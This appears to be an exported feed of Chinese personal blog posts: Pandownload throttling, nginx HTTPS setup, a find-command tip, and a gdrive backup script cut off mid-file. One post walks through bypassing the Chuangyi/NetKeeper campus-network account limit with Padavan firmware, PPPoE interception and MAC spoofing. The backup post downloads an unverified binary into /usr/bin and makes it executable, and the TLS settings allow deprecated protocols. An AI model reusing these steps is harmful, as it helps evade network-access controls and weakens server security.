        <content type="html"><![CDATA[<h2 id="1-现象说明"><a href="#1-现象说明" class="headerlink" title="1. 现象说明"></a>1. 现象说明</h2><p>众说周知，Pandownload是一款破解百度网盘限速的软件。然而毕竟是走非官网路线，有时候利用Pandownload下载东西，在下载到90%多时你会发现速度猛降，查看后面的连接数仅仅为1。</p><a id="more"></a><p><img data-src="https://pic.superbed.cn/item/5cfbabb8451253d178d9317d.png"></p><p>后面的绿色数字代表连接数，<em>我这里是修复后，所以连接数为40。</em></p><h2 id="2-原因"><a href="#2-原因" class="headerlink" title="2. 原因"></a>2. 原因</h2><p>查阅Pandownload官网给的FAQ，发现问题主要是</p><p><strong>百度是针对账号进行限速，当一个非会员账号下载量达到一定阈值就会触发限速。账号被限速之后容易出现下载错误、掉连接数等问题，需要过几天或者开通会员才会恢复。</strong></p><h2 id="3-解决方案"><a href="#3-解决方案" class="headerlink" title="3. 解决方案"></a>3. 解决方案</h2><p>原因说得很明白了，所以<strong>要不等几天等到限制解除，要不换号继续下载即可。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pandownload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用荒野无灯的Padavan固件破解创翼的一人一号制度</title>
      <link href="/archives/5e50a2b7.html"/>
      <url>/archives/5e50a2b7.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-背景提出"><a href="#1-背景提出" class="headerlink" title="1. 背景提出"></a>1. 背景提出</h2><p>作为一个大四老狗，回想当年也是恶心着创翼（原名NetKeeper)的一人一号过来的。 后来有一些破解方式，不过有一些已经不再适用，但也还有一些能够存活。下面介绍一些破解方式吧。</p><ul><li>SimpleNetkeeper Android版本：这个是个很老的软件，当然由于创翼升级算法，它也不再适用了。但是确实是最好用的一个软件，毕竟直接用手机就能联网，简直美滋滋。</li><li>SImpleNetKeeper Pc版本：出自同一个作者，作者已停止该软件的维护，如果你曾经在作者官网上注册过，那么<strong>还是可用的</strong>，现在官网已关闭，无法注册意味着你也无法再使用这个软件了。</li><li>DiyBox：这是一个路由器固件，需要自己刷，我没玩过这个系统，原来实验室倒是用的这个固件，该固件要收费（不过似乎可破解，但是挺麻烦的），所以不太推荐。</li><li>Openwrt：这是一个很出名的固件，支持很多路由器，所以也广受欢迎，不过不是一键可食用，需要自己去配置一些东西。</li><li><strong>Padavan：这里仅说荒野无灯版本的padavan固件</strong>，额外插一句，padavan固件又名老子固件，最开始由俄罗斯人开发，所以被称为老毛子，之后国人有不少人再此基础上又进行了二次开发，主要是加入一些插件。其中以荒野无灯与Hiboy两位大佬的padavan最为出名。个人目前在使用的就是这个固件来破解，简单稳定。</li></ul><a id="more"></a><p>破解过程主要分为两个步骤：</p><ol><li>刷入padavan系统</li><li>设置padavan，用于拦截创翼拨号，从而实现破解一人一号机制</li></ol><h2 id="2-刷机过程"><a href="#2-刷机过程" class="headerlink" title="2. 刷机过程"></a>2. 刷机过程</h2><h3 id="2-1-材料准备"><a href="#2-1-材料准备" class="headerlink" title="2.1 材料准备"></a>2.1 材料准备</h3><ul><li>一台可刷padavan固件的<strong>路由器</strong>，支持列表如下：<br> <img data-src="https://pic.superbed.cn/item/5cfbb5d0451253d178d9d14a.png"></li></ul><p>我使用的是k2p A2版路由器（一共有三个版本A1,A2,B1,不要买B1)，转转平台上售价大约在130-140软妹币左右。当然还有很多路由器可选，小米3路由、新3路由、k2路由都是支持的。自行决定。</p><ul><li>padavan固件：可从<span class="exturl" data-url="aHR0cDovL3JvbS5uYW5vZG0ubmV0L0syUC8=" title="http://rom.nanodm.net/K2P/">http://rom.nanodm.net/K2P/<i class="fa fa-external-link"></i></span> 这里下载。当然，最全资源地当然是<span class="exturl" data-url="aHR0cHM6Ly93d3cucmlnaHQuY29tLmNuL2ZvcnVtLw==" title="https://www.right.com.cn/forum/">恩山论坛<i class="fa fa-external-link"></i></span>啦。</li><li>网线</li><li><span class="exturl" data-url="aHR0cHM6Ly9icmVlZC5oYWNrcGFzY2FsLm5ldC9icmVlZC1tdDc2MjEtcGhpY29tbS1rMnAuYmlu" title="https://breed.hackpascal.net/breed-mt7621-phicomm-k2p.bin">Breed固件<i class="fa fa-external-link"></i></span></li><li>TFTP32软件</li></ul><h3 id="2-2-刷机"><a href="#2-2-刷机" class="headerlink" title="2.2 刷机"></a>2.2 刷机</h3><p>以K2P为例讲解刷机，其余路由器上<span class="exturl" data-url="aHR0cHM6Ly93d3cucmlnaHQuY29tLmNuL2ZvcnVt" title="https://www.right.com.cn/forum">恩山论坛自行搜索<i class="fa fa-external-link"></i></span>，刷机流程代替分为两步，一是刷入Breed（有可能你买入的路由器已经刷入Breed，那么就不用刷入了），而是刷入固件。流程图如下：</p><p><img data-src="https://raw.githubusercontent.com/ravenxrz/BlogPic/master/img/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%B7%E6%9C%BA%E6%B5%81%E7%A8%8B1.jpg"></p><p>具体的刷机教程可参见这篇博文和配套视频</p><p>博文：<span class="exturl" data-url="aHR0cHM6Ly90YnZ2Lm5ldC9wb3N0cy8wMTAxLWJyZWVkLmh0bWw=" title="https://tbvv.net/posts/0101-breed.html">https://tbvv.net/posts/0101-breed.html<i class="fa fa-external-link"></i></span></p><p>视频：<span class="exturl" data-url="aHR0cHM6Ly92LnlvdWt1LmNvbS92X3Nob3cvaWRfWE16azBNekl4TXpZM01nPT0uaHRtbA==" title="https://v.youku.com/v_show/id_XMzk0MzIxMzY3Mg==.html">https://v.youku.com/v_show/id_XMzk0MzIxMzY3Mg==.html<i class="fa fa-external-link"></i></span></p><h3 id="2-3-输入padavan固件"><a href="#2-3-输入padavan固件" class="headerlink" title="2.3 输入padavan固件"></a>2.3 输入padavan固件</h3><p><strong>刷机之前，记得备份EEPROM,具体方法：高级设置 —&gt; 系统设置 —&gt; 手动升级 —&gt; 下载备份EEPROM(是一个压缩包)。</strong></p><p>上小节的博文和视频其实也说了怎么刷固件，这里再说一下：</p><h4 id="方法1："><a href="#方法1：" class="headerlink" title="方法1："></a>方法1：</h4><p>高级设置 —&gt; 系统设置 —&gt; 手动升级 —&gt; 浏览 —&gt; 选择自己下载的固件 —&gt; 点击升级即可。<br>网页刷机进度条不准确可忽略，固件写入、重启、首次启动初始化这个过程实际需要3—5分钟不等，不要着急，如果固件不兼容需要手动进breed重刷</p><h4 id="方法2："><a href="#方法2：" class="headerlink" title="方法2："></a>方法2：</h4><p>手动进入breed刷</p><p>路由WAN口的网线拔掉避免IP冲突，电脑网线连接路由LAN口，电脑网卡设置为自动获取IP<br>路由断电3秒—&gt;按住复位键不要松手—&gt;插入电源—&gt;等待5秒后松开复位键—&gt;浏览器输入192.168.1.1—&gt;固件更新—&gt;选择固件刷入。</p><ul><li>如果网页错误说明 WAN口IP冲突 或 没有清理浏览器缓存</li><li>闪存布局: K2大部分固件是0x50000，官方V22.5.XX.XX以后的固件选0xA0000，固件无法做到统一，如果不启动就换另一种布局重刷</li></ul><h2 id="3-一起来破解创翼吧"><a href="#3-一起来破解创翼吧" class="headerlink" title="3. 一起来破解创翼吧"></a>3. 一起来破解创翼吧</h2><p>先看看创翼版本：</p><p><img data-src="https://pic.superbed.cn/item/5cfbb5d1451253d178d9d17d.jpg"></p><p>这是<strong>最新创翼5.2.12版本，实测4.7.9</strong>也可以成功拨号。</p><p>step1：打开padavan控制Web（192.168.6.1），在系统管理-&gt;控制台中执行：<strong>nvram set ext_show_pppoesvr=1</strong></p><p>step2：之后刷新界面，就会在扩展插件栏中发现多了一个PPPoE Server的选项。按如图配置：</p><p><img data-src="https://pic.superbed.cn/item/5cfbb5d3451253d178d9d1c7.jpg"></p><p>step3：打开外部网络（WAN）选项，选择外网连接类型为<strong>PPPoE。</strong></p><p><img data-src="https://pic.superbed.cn/item/5cfbb5d4451253d178d9d1fc.jpg"></p><p>step4：打开创翼，填写账号密码点击拨号。查看是否能成功。</p><p>如果到这里你已经成功了，那么恭喜你,可以溜了。</p><hr><p>如果你发现仍未成功，首先到日志中查看是否有拦截到账号，如果有但是报错（我遇到的错误是：No PPP Secert for xxxx），<strong>这个时候可通过修改路由MAC地址为本地PC的<code>MAC</code>地址来解决。</strong><br>具体操作如下：<br>step1:打开cmd窗口，执行<code>ipconfig /all</code>命令。<br>如果你是采用无线连接到路由器拨号，那么找到无线局域网适配器WLAN的物理地址，如果是以太网连接路由器拨号则找到以太网的物理地址。这里我以无线的为例：</p><p><img data-src="https://pic.superbed.cn/item/5cfbb5d6451253d178d9d22f.jpg"></p><p>step2:找到这行以后，抄下来（不要每两个字符之间的“-”）然后到padavan的外网连接选项中去修改MAC，如下图：</p><p><img data-src="https://pic1.superbed.cn/item/5cfbb5d7451253d178d9d262.jpg"></p><p>可在网络地图中查看是否修改成功：</p><p><img data-src="https://pic3.superbed.cn/item/5cfbb5d9451253d178d9d2a2.jpg"></p><p>step3：最后拨号应该就可以连接了。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><span class="exturl" data-url="aHR0cHM6Ly90YnZ2Lm5ldC9wb3N0cy8wMTAxLWJyZWVkLmh0bWw=" title="https://tbvv.net/posts/0101-breed.html">斐讯K1、K2、K2P 刷机、刷入Breed 辅助工具<i class="fa fa-external-link"></i></span></p>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> padavan </tag>
            
            <tag> 校园网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用find指令查找文件遇见的一点小坑</title>
      <link href="/archives/dc78766f.html"/>
      <url>/archives/dc78766f.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>最近在学习<code>linux</code>内核数据结构，准备找找队列的头文件<code>kfifo.h</code>，但是通过<code>/lib/modules/内核版本/build</code>下面使用<code>find</code>指令找，怎么都找不到。。。</p><a id="more"></a><h2 id="2-问题"><a href="#2-问题" class="headerlink" title="2. 问题"></a>2. 问题</h2><p>如图，使用<code>find</code>指令找不到</p><p><img data-src="https://pic.superbed.cn/item/5cfbad0f451253d178d94b6e.png" alt="在这里插入图片描述"></p><p>但是使用<code>locate</code>指令却找得到:</p><p><img data-src="https://pic.superbed.cn/item/5cfbad10451253d178d94bc0.png" alt="在这里插入图片描述"></p><p>这就让我很纳闷了，最后读了一下<code>find</code>的<code>manual page</code>，发现了问题所在，</p><p><img data-src="https://pic2.superbed.cn/item/5cfbad12451253d178d94c17.png" alt="在这里插入图片描述"></p><p>咦，好像这里出现了符号链接，而且我的当前目录下的文件目录颜色也怪怪的。</p><p><img data-src="https://pic.superbed.cn/item/5cfbad15451253d178d94c7b.png" alt="在这里插入图片描述"></p><p>好吧，真的是因为符号链接的问题造成了无法搜索到文件。加上“-L”指令，搞定。</p><p><img data-src="https://pic.superbed.cn/item/5cfbad19451253d178d94cc8.png" alt="在这里插入图片描述"></p><h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a>3. 总结</h2><p><code>find</code> 指令默认不开启软链接的搜索</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> find命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从零开始搭建属于自己的博客系列教程七-开启全站HTTPS</title>
      <link href="/archives/1eb3d9.html"/>
      <url>/archives/1eb3d9.html</url>
      
        <content type="html"><![CDATA[<p>系列教程目录：</p><ul><li><a href="https://www.ravenxrz.ink/archives/b5eb44b9.html">从零开始搭建属于自己的博客系列教程零 – 绪论</a></li><li><a href="https://www.ravenxrz.ink/archives/4c781aa7.html">从零开始搭建属于自己的博客系列教程一 – 博客系统搭建</a></li><li><a href="https://www.ravenxrz.ink/archives/1cbfa5af.html">从零开始搭建属于自己的博客系列教程二 – 域名绑定</a></li><li><a href="https://www.ravenxrz.ink/archives/9f4d945c.html">从零开始搭建属于自己的博客系列教程三 – 主题选择与CommentToMail插件介绍</a></li><li><a href="https://www.ravenxrz.ink/archives/e8deae94.html">从零开始搭建属于自己的博客系列教程四 – 去掉烦人的index.php后缀与常用插件介绍</a></li><li><a href="https://www.ravenxrz.ink/archives/3cc5aa32.html">从零开始搭建属于自己的博客系列教程五 – 图床选择与博客迁移</a></li><li><a href="https://www.ravenxrz.ink/archives/11c4d80.html">从零开始搭建属于自己的博客系列教程六 – 博客系统备份</a></li><li><a href="https://www.ravenxrz.ink/archives/1eb3d9.html">从零开始搭建属于自己的博客系列教程七 – 开启全站HTTPS</a></li></ul><a id="more"></a><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><blockquote><p>昨天无聊把博客图床换了，今天继续来优化下博客。发现以前我走的url都是http，所以在浏览器上会显示“不安全”的字眼，今天就来把http转为https。</p></blockquote><p>小科普：https是在HTTP的基础上加入了SSL/TLS协议，依靠SSL证书来验证服务器的身份，并为客户端和服务器端之间建立“SSL加密通道”，确保用户数据在传输过程中处于加密状态，同时防止服务器被钓鱼网站假冒。</p><h2 id="2-证书申请"><a href="#2-证书申请" class="headerlink" title="2. 证书申请"></a>2. 证书申请</h2><p>对于个人博客来说，不需要太高等级的安全保证，所以只用申请DV域名型https证书即可。可在腾讯云或者阿里云上免费申请，保质期一年，一年后重新申请即可。下面以腾讯云为例讲讲步骤：<br>打开<span class="exturl" data-url="aHR0cHM6Ly9jb25zb2xlLmNsb3VkLnRlbmNlbnQuY29tL3NzbA==" title="https://console.cloud.tencent.com/ssl">腾讯云SLL控制管理<i class="fa fa-external-link"></i></span><br><img data-src="https://pic3.superbed.cn/item/5cfbb5a7451253d178d9cbb7.png"></p><p>确认证书类型：</p><p><img data-src="https://pic1.superbed.cn/item/5cfbb5a8451253d178d9cbf0.png"></p><p>按照提示一步一步填写信息</p><p><img data-src="https://pic2.superbed.cn/item/5cfbb5aa451253d178d9cc32.png"></p><p>选择手动DNS验证</p><p><img data-src="https://pic3.superbed.cn/item/5cfbb5ab451253d178d9cc7c.png"></p><p>点击查看证书详情，跳转到证书信息页面</p><p><img data-src="https://pic.superbed.cn/item/5cfbb5ad451253d178d9ccbf.png"></p><p>然后到设置一个域名解析就好了，解析记录所需要填写的字段就是现在的证书详情上的字段。（因为我已经申请过了，所以现在看不到这些字段，就不好截图了）。</p><p><img data-src="https://pic.superbed.cn/item/5cfbb5ae451253d178d9ccec.png"></p><p>等待几分钟，等待CA机构扫描成功后，腾讯云会发送一封邮件给你提醒配置成功，这个时候就可以下载证书。</p><p><img data-src="https://pic.superbed.cn/item/5cfbb5af451253d178d9cd1e.png"></p><p>下载出来会有四个文件夹，我用的是Nginx，所以只用关注Nginx即可。</p><h2 id="3-配置Nginx服务器"><a href="#3-配置Nginx服务器" class="headerlink" title="3. 配置Nginx服务器"></a>3. 配置Nginx服务器</h2><p>step1:将解压出来的Nginx文件夹中的两个文件防止到服务器的<code>/usr/local/nginx/conf</code> 目录下。</p><p>step2:编辑 Nginx 根目录下的 conf/nginx.conf 文件。修改内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">     listen 443;</span><br><span class="line">     server_name www.domain.com; #填写绑定证书的域名</span><br><span class="line">     ssl on;</span><br><span class="line">     ssl_certificate 1_www.domain.com_bundle.crt;#证书文件名称</span><br><span class="line">     ssl_certificate_key 2_www.domain.com.key;#私钥文件名称</span><br><span class="line">     ssl_session_timeout 5m;</span><br><span class="line">     ssl_protocols TLSv1 TLSv1.1 TLSv1.2; #请按照这个协议配置</span><br><span class="line">     ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;#请按照这个套件配置</span><br><span class="line">     ssl_prefer_server_ciphers on;</span><br><span class="line">     location &#x2F; &#123;</span><br><span class="line">         root &#x2F;var&#x2F;www&#x2F;www.domain.com; #网站主页路径。此路径仅供参考，具体请您按照实际目录操作。</span><br><span class="line">         index  index.html index.htm;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>注意把相关项对应到你的相关项，如域名，证书文件名等。。</p><p>step3: 重启 Nginx，现在你应该可以通过https://域名访问你的博客了。</p><p>step4: TYPECHO 配置</p><p>登录Typecho后台 -&gt; 设置 -&gt; 基本设置 -&gt; 站点地址改成 https://你的域名</p><p>编辑Typecho站点根目录下的文件config.inc.php加入下面一行配置，否则网站后台还是会调用HTTP资源。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;** 开启HTTPS *&#x2F;</span><br><span class="line">define(&#39;__TYPECHO_SECURE__&#39;,true);</span><br></pre></td></tr></table></figure><h2 id="4-重定向Http到Https"><a href="#4-重定向Http到Https" class="headerlink" title="4. 重定向Http到Https"></a>4. 重定向Http到Https</h2><p>仍然是打开刚才的配置文件nginx.conf,填写以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 443;</span><br><span class="line">    server_name www.domain.com; #填写绑定证书的域名</span><br><span class="line">    ssl on;</span><br><span class="line">    root &#x2F;var&#x2F;www&#x2F;www.domain.com; #网站主页路径。此路径仅供参考，具体请您按照实际目录操作。</span><br><span class="line">    index index.html index.htm;   #上面配置的文件夹里面的index.html</span><br><span class="line">    ssl_certificate  1_www.domain.com_bundle.crt; #证书文件名称</span><br><span class="line">    ssl_certificate_key 2_www.domain.com.key; #私钥文件名称</span><br><span class="line">    ssl_session_timeout 5m;</span><br><span class="line">    ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;</span><br><span class="line">    ssl_protocols TLSv1 TLSv1.1 TLSv1.2;</span><br><span class="line">    ssl_prefer_server_ciphers on;</span><br><span class="line">    location &#x2F; &#123;</span><br><span class="line">       index index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name www.domain.com; #填写绑定证书的域名</span><br><span class="line">    rewrite ^(.*)$ https:&#x2F;&#x2F;$host$1 permanent; #把http的域名请求转成https</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意把相关项对应到你的相关项，如域名，证书文件名等。</p><p>至此就完成了http转换到https的配置。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><span class="exturl" data-url="aHR0cHM6Ly9idXh1aHVuYW8uY29tL2FydGljbGUvYmxvZy10by1odHRwcy5odG1sI2RpcmVjdG9yeTAwOTE2NzYxODgwNzcyMzM4ODEx" title="https://buxuhunao.com/article/blog-to-https.html#directory00916761880772338811">博客全站启用HTTPS<i class="fa fa-external-link"></i></span></p><p><span class="exturl" data-url="aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kb2N1bWVudC9wcm9kdWN0LzQwMC8zNTI0NA==" title="https://cloud.tencent.com/document/product/400/35244">Nginx 服务器证书安装<i class="fa fa-external-link"></i></span></p>]]></content>
      
      
      <categories>
          
          <category> 博客搭建 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>从零开始搭建属于自己的博客系列教程六-博客系统备份</title>
      <link href="/archives/11c4d80.html"/>
      <url>/archives/11c4d80.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-写在最前面"><a href="#1-写在最前面" class="headerlink" title="1.  写在最前面"></a>1.  写在最前面</h2><blockquote><p>折腾了整整一个五一，总算是完成了自己的博客系统。为了给想要搭建自己的博客，但是又和我一样是技术小白的人铺点路，所以准备开个博客搭建的系列教程，避免后来人像我一样走了一大堆弯路。</p></blockquote><p>先贴上自己的博客网站：<a href="https://www.ravenxrz.ink/">https://www.ravenxrz.ink</a>   </p><a id="more"></a><p>系列教程目录：</p><ul><li><a href="https://www.ravenxrz.ink/archives/b5eb44b9.html">从零开始搭建属于自己的博客系列教程零 – 绪论</a></li><li><a href="https://www.ravenxrz.ink/archives/4c781aa7.html">从零开始搭建属于自己的博客系列教程一 – 博客系统搭建</a></li><li><a href="https://www.ravenxrz.ink/archives/1cbfa5af.html">从零开始搭建属于自己的博客系列教程二 – 域名绑定</a></li><li><a href="https://www.ravenxrz.ink/archives/9f4d945c.html">从零开始搭建属于自己的博客系列教程三 – 主题选择与CommentToMail插件介绍</a></li><li><a href="https://www.ravenxrz.ink/archives/e8deae94.html">从零开始搭建属于自己的博客系列教程四 – 去掉烦人的index.php后缀与常用插件介绍</a></li><li><a href="https://www.ravenxrz.ink/archives/3cc5aa32.html">从零开始搭建属于自己的博客系列教程五 – 图床选择与博客迁移</a></li><li><a href="https://www.ravenxrz.ink/archives/11c4d80.html">从零开始搭建属于自己的博客系列教程六 – 博客系统备份</a></li><li><a href="https://www.ravenxrz.ink/archives/1eb3d9.html">从零开始搭建属于自己的博客系列教程七 – 开启全站HTTPS</a></li></ul><h2 id="2-备份你的博客"><a href="#2-备份你的博客" class="headerlink" title="2.  备份你的博客"></a>2.  备份你的博客</h2><p>很明显，个人搭建的博客万一down掉了可不像简书、csdn这种网站有人维护，所以我们需要自己定时来备份自己的博客。</p><p>注意，备份云盘是<strong>google drive</strong>。</p><h3 id="2-1-安装gdrive"><a href="#2-1-安装gdrive" class="headerlink" title="2.1  安装gdrive"></a>2.1  安装gdrive</h3><p>打开XShell，执行以下代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget -O &#x2F;usr&#x2F;bin&#x2F;gdrive &quot;https:&#x2F;&#x2F;docs.google.com&#x2F;uc?id&#x3D;0B3X9GlR6EmbnQ0FtZmJJUXEyRTA&amp;export&#x3D;download&quot;</span><br><span class="line">chmod +x &#x2F;usr&#x2F;bin&#x2F;gdrive</span><br><span class="line">gdrive about</span><br></pre></td></tr></table></figure><p>之后，将命令行给出的url复制到浏览器中，打开。（google drive，你懂需要什么的）</p><p>授权后，会给出token，复制粘贴到XShell中。即可</p><h3 id="2-2-备份脚本"><a href="#2-2-备份脚本" class="headerlink" title="2.2 备份脚本"></a>2.2 备份脚本</h3><p>参考了<span class="exturl" data-url="aHR0cHM6Ly93d3cubW9lcmF0cy5jb20vYXJjaGl2ZXMvMjk2LyVFRiVCQyU4QyVFNiU4OSU4MCVFNyVCQiU5OSVFNyU5QSU4NCVFOCU4NCU5QSVFNiU5QyVBQyVFMyU4MCU4MiVFNiU4OCU5MSVFNCVCQiVBQyVFOCVBNiU4MSVFNyU5RiVBNSVFOSU4MSU5MyVFRiVCQyU4QyVFNSVBNCU4NyVFNCVCQiVCRCVFNyU5QSU4NCVFNCVCOCU5QyVFOCVBNSVCRiVFNCVCOCVCQiVFOCVBNiU4MSVFNiU5QyU4OSVFNCVCOCVBNCVFNCVCOCVBQSVFRiVCQyU4QyVFNCVCOCU4MCVFNCVCOCVBQSVFNiU5OCVBRiVFNiU5NiU4NyVFNyVBQiVBMCVFNyU5QSU4NCVFNiU5NSVCMCVFNiU4RCVBRSVFNSVCQSU5MyVFRiVCQyU4QyVFOCVCRiU5OSVFNCVCOCVBQSVFNSVCRSU4OCVFNSVCMCU4RiVFRiVCQyU4QyVFNCVCRCU4NiVFNiU5OCVBRiVFOSU5QyU4MCVFOCVBNiU4MSVFNyVCQiU4RiVFNSVCOCVCOCVFNSVBNCU4NyVFNCVCQiVCRCVFMyU4MCU4MiVFNSU4RiVBNiVFNCVCOCU4MCVFNCVCOCVBQSVFNiU5OCVBRiVFNiU5NSVCNCVFNCVCOCVBQSVFNyVCRCU5MSVFNyVBQiU5OSVFNyU5QSU4NCVFOCVBRSVCRSVFNyVCRCVBRSVFRiVCQyU4QyVFNiU4RiU5MiVFNCVCQiVCNiVFMyU4MCU4MSVFNCVCOCVCQiVFOSVBMiU5OCVFNyVBRCU4OSVFNyVBRCU4OSVFRiVCQyU4QyVFOCVCRiU5OSVFNCVCOCVBQSVFNSVCRSU4OCVFNSVBNCVBNyVFRiVCQyU4QyVFNSU4RCVCNCVFNCVCOCU4RCVFOSU5QyU4MCVFOCVBNiU4MSVFNyVCQiU4RiVFNSVCOCVCOCVFNiU5NCVCOSVFNSU4QSVBOCVFMyU4MCU4MiVFNiU4OSU4MCVFOSU5QyU4MCVFNiU4OCU5MSVFNSVCMCU4NiVFOCU4NCU5QSVFNiU5QyVBQyVFNiU5NCVCOSVFNCVCOCVCQSVFNCVCQSU4NiVFNCVCOCVBNCVFNCVCOCVBQSVFRiVCQyU4QyVFNSU4OCU4NiVFNSU4OCVBQiVFOCVBRSVCRSVFNyVCRCVBRSVFNSVBRSU5QSVFNiU5QyU5RiVFNSVBNCU4NyVFNCVCQiVCRCVFNiU5NyVCNiVFOSU5NyVCNCVFMyU4MCU4Mg==" title="https://www.moerats.com/archives/296/%EF%BC%8C%E6%89%80%E7%BB%99%E7%9A%84%E8%84%9A%E6%9C%AC%E3%80%82%E6%88%91%E4%BB%AC%E8%A6%81%E7%9F%A5%E9%81%93%EF%BC%8C%E5%A4%87%E4%BB%BD%E7%9A%84%E4%B8%9C%E8%A5%BF%E4%B8%BB%E8%A6%81%E6%9C%89%E4%B8%A4%E4%B8%AA%EF%BC%8C%E4%B8%80%E4%B8%AA%E6%98%AF%E6%96%87%E7%AB%A0%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%8C%E8%BF%99%E4%B8%AA%E5%BE%88%E5%B0%8F%EF%BC%8C%E4%BD%86%E6%98%AF%E9%9C%80%E8%A6%81%E7%BB%8F%E5%B8%B8%E5%A4%87%E4%BB%BD%E3%80%82%E5%8F%A6%E4%B8%80%E4%B8%AA%E6%98%AF%E6%95%B4%E4%B8%AA%E7%BD%91%E7%AB%99%E7%9A%84%E8%AE%BE%E7%BD%AE%EF%BC%8C%E6%8F%92%E4%BB%B6%E3%80%81%E4%B8%BB%E9%A2%98%E7%AD%89%E7%AD%89%EF%BC%8C%E8%BF%99%E4%B8%AA%E5%BE%88%E5%A4%A7%EF%BC%8C%E5%8D%B4%E4%B8%8D%E9%9C%80%E8%A6%81%E7%BB%8F%E5%B8%B8%E6%94%B9%E5%8A%A8%E3%80%82%E6%89%80%E9%9C%80%E6%88%91%E5%B0%86%E8%84%9A%E6%9C%AC%E6%94%B9%E4%B8%BA%E4%BA%86%E4%B8%A4%E4%B8%AA%EF%BC%8C%E5%88%86%E5%88%AB%E8%AE%BE%E7%BD%AE%E5%AE%9A%E6%9C%9F%E5%A4%87%E4%BB%BD%E6%97%B6%E9%97%B4%E3%80%82">https://www.moerats.com/archives/296/，所给的脚本。我们要知道，备份的东西主要有两个，一个是文章的数据库，这个很小，但是需要经常备份。另一个是整个网站的设置，插件、主题等等，这个很大，却不需要经常改动。所需我将脚本改为了两个，分别设置定期备份时间。<i class="fa fa-external-link"></i></span></p><p>执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir &#x2F;home&#x2F;wwwbackups</span><br><span class="line">cd &#x2F;home&#x2F;wwwbackups</span><br></pre></td></tr></table></figure><p><code>vi googledrive-website.sh</code> 输入以下内容</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment">##-----------------------Database Access--------------------------##</span></span><br><span class="line">DB_NAME=<span class="string">&quot;typecho&quot;</span></span><br><span class="line">DB_USER=<span class="string">&quot;root&quot;</span></span><br><span class="line">DB_PASSWORD=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">##-----------------------Folder Web or Folder you want to backup--------------------------##</span></span><br><span class="line"><span class="comment"># 